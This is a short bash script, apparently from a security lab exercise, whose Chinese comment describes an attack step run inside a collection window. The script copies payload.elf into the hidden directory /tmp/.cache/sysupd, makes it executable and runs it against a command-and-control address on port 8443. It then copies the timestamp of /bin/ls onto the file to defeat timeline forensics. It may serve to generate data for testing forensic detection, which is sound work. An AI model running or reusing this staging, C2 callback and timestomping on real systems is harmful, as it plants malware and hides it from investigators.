#!/usr/bin/env bash
# attack（窗口内）：投放执行后回拨 mtime（stat 快照由采集端窗口后拍摄）。
set -euo pipefail
C2_IP="${SECLAB_C2_IP:-198.51.100.50}"
cp payload.elf /tmp/.cache/sysupd/payload.elf
chmod 0755 /tmp/.cache/sysupd/payload.elf
/tmp/.cache/sysupd/payload.elf "$C2_IP" 8443
touch -r /bin/ls /tmp/.cache/sysupd/payload.elf
